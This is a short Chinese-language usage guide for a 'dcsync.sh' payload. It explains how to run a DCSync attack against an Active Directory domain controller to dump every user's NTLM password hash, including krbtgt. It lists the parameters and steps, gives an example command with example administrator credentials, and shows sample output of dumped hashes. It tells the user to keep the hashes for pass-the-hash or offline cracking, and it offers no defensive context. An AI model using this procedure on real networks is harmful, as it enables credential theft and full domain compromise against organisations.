## 📦 载荷使用说明：dcsync.sh

### 📝 功能说明
利用 DCSync 攻击技术，模拟域控制器向目标域控发起目录复制请求，从而在不需要直接登录域控的情况下导出域内所有用户的密码哈希（包括 krbtgt）。

### ⚙️ 参数说明
```text
- `domain`：目标域名
- `username`：具有 DCSync 权限的用户名（通常是 Domain Admins 或 Enterprise Admins）
- `password`：用户密码或 Hash
- `dc_ip`：目标域控制器的 IP 地址
```

### 🚀 操作步骤
1. 确认已获得具有目录复制权限（DCSync）的域账户凭据。
2. 修改脚本中的域名、凭据和域控 IP。
3. 执行脚本：`bash dcsync.sh`。
4. 保存输出的 NTLM Hash 列表，用于后续的哈希传递（Pass-the-Hash）或离线破解。

### 💻 执行样例
```bash
# 使用 administrator 凭据对 192.168.1.10 发起 DCSync 攻击
./dcsync.sh contoso.com administrator Admin@123 192.168.1.10

# 预期输出：
# [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
# [*] Using the DRSUAPI method to get NTDS.DIT secrets
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
# krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1234567890abcdef1234567890abcdef:::
```
